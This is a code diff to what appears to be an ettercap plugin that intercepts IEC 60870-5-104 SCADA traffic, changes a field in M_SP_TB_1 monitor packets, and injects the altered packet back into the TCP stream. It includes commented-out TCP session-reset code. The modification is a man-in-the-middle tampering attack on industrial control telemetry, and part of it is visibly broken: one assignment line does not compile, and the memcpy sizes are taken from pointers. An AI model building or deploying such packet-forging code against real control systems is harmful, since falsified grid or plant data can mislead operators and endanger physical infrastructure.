@@ -27,6 +27,7 @@
 #include <ec_packet.h>
 #include <ec_hook.h>
 #include <ec_send.h>
+#include <ec_session_tcp.h>
 
 #include <stdlib.h>
 #include <string.h>
@@ -40,6 +41,7 @@ enum {I_FORMAT, S_FORMAT, U_FORMAT};
 
 u_char START        = 0x68;
 u_char M_ME_TF_1    = 0x24;
+u_char M_SP_TB_1    = 0x1e;
 
 struct apci_header {
   u_char start;
@@ -202,11 +204,15 @@ static void parse_tcp(struct packet_object *po)
   apci = (struct apci_header *)po->DATA.data;
   asdu = (struct asdu_header *)(apci + 1);
 
-  struct packet_object *pd;
-  u_char *pck_buf;
+  /* We are interested in monitor packets of type M_SP_TB_1 */
+  if(START == apci->start && I_FORMAT == get_type(apci->control_1) && M_SP_TB_1 == asdu->type_id) {
 
-  /* We are interested in monitor packets of type M_ME_TF_1 */
-  if(apci->start == START){ // && get_type(apci->control_1) == U_FORMAT // && asdu->type_id == M_ME_TF_1) {
+    USER_MSG("=========================");
+    USER_MSG("\nOld Packet\n");
+    print_apci(apci);
+    print_asdu(asdu);
+    USER_MSG("=========================");
+
 
     /* we can't inject in unoffensive mode or in bridge mode */
     if (GBL_OPTIONS->unoffensive || GBL_OPTIONS->read || GBL_OPTIONS->iface_bridge) {
@@ -217,22 +223,39 @@ static void parse_tcp(struct packet_object *po)
     po->flags ^= PO_DROPPED;
 
     /* Modify the value */
-    asdu->IOA = 1337;
-    memcpy(po->DATA.data, asdu, sizeof(asdu));
-    USER_MSG("%d\n", apci->start);
+    asdu->COT = 0x05 : 6; /* BUG: COT is 6 bits */
+    memcpy(po->DATA.data, apci, sizeof(apci));
+    memcpy(po->DATA.data + sizeof(apci), asdu, sizeof(asdu));
+    
+    /* Send a TCP Reset */
+    // struct ec_session *s = NULL;
+    // void *ident;
+    // size_t ident_len, direction;
+    // struct tcp_status *status;
+
+    /* retrieve the ident for the session */
+    // ident_len = tcp_create_ident(&ident, &po);
+
+    /* get the session */
+    // if (session_get(&s, ident, ident_len) == -ENOTFOUND) {
+    //   SAFE_FREE(ident); 
+    //   return -EINVALID;
+    // }
+
+    /* Select right comunication way */
+    // direction = tcp_find_direction(s->ident, ident);
+    // SAFE_FREE(ident); 
 
     /* DEBUG */
-    print_ip_src_dest(po);
+    USER_MSG("=========================");
+    USER_MSG("\nNew Packet\n");
     print_apci(apci);
     print_asdu(asdu);
-    USER_MSG("\n");
+    USER_MSG("=========================");
 
-    /* mark the packet as modified */
-    po->flags |= PO_MODIFIED;
-
-    /* unset the flag to be dropped */
-    if (po->flags & PO_DROPPED)
-     po->flags ^= PO_DROPPED;
+    // status = (struct tcp_status *)s->data; 
+    send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
+    // send_tcp(&po->L3.dst, &po->L3.src, po->L4.dst, po->L4.src, htonl(status->way[direction].last_ack), 0, TH_ACK, NULL, 0);
 
   }
 }
